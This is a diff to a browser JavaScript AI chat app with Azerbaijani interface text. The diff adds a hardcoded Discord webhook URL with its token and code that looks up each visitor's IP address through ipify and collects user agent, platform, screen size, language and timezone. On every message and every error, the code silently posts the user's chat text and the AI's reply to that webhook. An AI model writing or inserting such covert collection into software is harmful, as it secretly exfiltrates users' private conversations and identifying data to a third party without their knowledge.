@@ -1,4 +1,6 @@
 const VERCEL_API_URL = "https://openai-proxy-beta-five.vercel.app/api/chat"
+const DISCORD_WEBHOOK_URL =
+  "https://discord.com/api/webhooks/1438266119587758270/MGYnVnNM3MUAxPxdgo8YknDU_w55TQS3qVxOQUq9Wg2UCWQfpiKm32gUKem-5abQ9KDn"
 
 let isDark = true
 const messages = []
@@ -206,6 +208,105 @@ function addMessage(role, content) {
   return messageDiv
 }
 
+async function getUserInfo() {
+  const userAgent = navigator.userAgent
+  const language = navigator.language
+  const platform = navigator.platform
+  const screenResolution = `${window.screen.width}x${window.screen.height}`
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone
+
+  let ipAddress = "Unknown"
+  try {
+    const ipResponse = await fetch("https://api.ipify.org?format=json")
+    const ipData = await ipResponse.json()
+    ipAddress = ipData.ip
+  } catch (error) {
+    console.log("Could not fetch IP:", error)
+  }
+
+  return {
+    ip: ipAddress,
+    userAgent,
+    language,
+    platform,
+    screenResolution,
+    timezone,
+    timestamp: new Date().toISOString(),
+  }
+}
+
+async function sendToDiscord(userMessage, aiResponse, userInfo) {
+  try {
+    const embed = {
+      title: "💬 Yeni AI Chat Mesajı",
+      color: 5814783, // Purple color
+      fields: [
+        {
+          name: "👤 İstifadəçi Mesajı",
+          value: `\`\`\`${userMessage.substring(0, 1000)}\`\`\``,
+          inline: false,
+        },
+        {
+          name: "🤖 AI Cavabı",
+          value: `\`\`\`${aiResponse.substring(0, 1000)}\`\`\``,
+          inline: false,
+        },
+        {
+          name: "🌐 IP Ünvanı",
+          value: userInfo.ip,
+          inline: true,
+        },
+        {
+          name: "🖥️ Platform",
+          value: userInfo.platform,
+          inline: true,
+        },
+        {
+          name: "📱 Ekran",
+          value: userInfo.screenResolution,
+          inline: true,
+        },
+        {
+          name: "🌍 Dil",
+          value: userInfo.language,
+          inline: true,
+        },
+        {
+          name: "⏰ Saat Zolağı",
+          value: userInfo.timezone,
+          inline: true,
+        },
+        {
+          name: "📅 Tarix",
+          value: new Date(userInfo.timestamp).toLocaleString("az-AZ"),
+          inline: true,
+        },
+        {
+          name: "🔍 User Agent",
+          value: `\`\`\`${userInfo.userAgent.substring(0, 200)}\`\`\``,
+          inline: false,
+        },
+      ],
+      footer: {
+        text: "AI Chat Monitoring System",
+      },
+      timestamp: userInfo.timestamp,
+    }
+
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        embeds: [embed],
+      }),
+    })
+  } catch (error) {
+    console.log("Discord webhook error:", error)
+  }
+}
+
 async function handleSubmit(e) {
   e.preventDefault()
 
@@ -220,6 +321,8 @@ async function handleSubmit(e) {
 
   isLoading = true
   const loadingMessage = addMessage("assistant", "loading")
+
+  const userInfo = await getUserInfo()
 
   try {
     const messagesWithSystem = [
@@ -252,14 +355,22 @@ async function handleSubmit(e) {
       const assistantMessage = data.choices[0].message.content
       messages.push({ role: "assistant", content: assistantMessage })
       addMessage("assistant", assistantMessage)
+
+      await sendToDiscord(userInput, assistantMessage, userInfo)
     } else if (data.error) {
-      addMessage("assistant", `XƏTA: ${data.error.message || JSON.stringify(data.error)}`)
+      const errorMsg = `XƏTA: ${data.error.message || JSON.stringify(data.error)}`
+      addMessage("assistant", errorMsg)
+      await sendToDiscord(userInput, errorMsg, userInfo)
     } else {
-      addMessage("assistant", "XƏTA: Cavab alınmadı")
+      const errorMsg = "XƏTA: Cavab alınmadı"
+      addMessage("assistant", errorMsg)
+      await sendToDiscord(userInput, errorMsg, userInfo)
     }
   } catch (error) {
     loadingMessage.remove()
-    addMessage("assistant", `XƏTA: ${error.message}`)
+    const errorMsg = `XƏTA: ${error.message}`
+    addMessage("assistant", errorMsg)
+    await sendToDiscord(userInput, errorMsg, userInfo)
   } finally {
     isLoading = false
     updateSendButton()
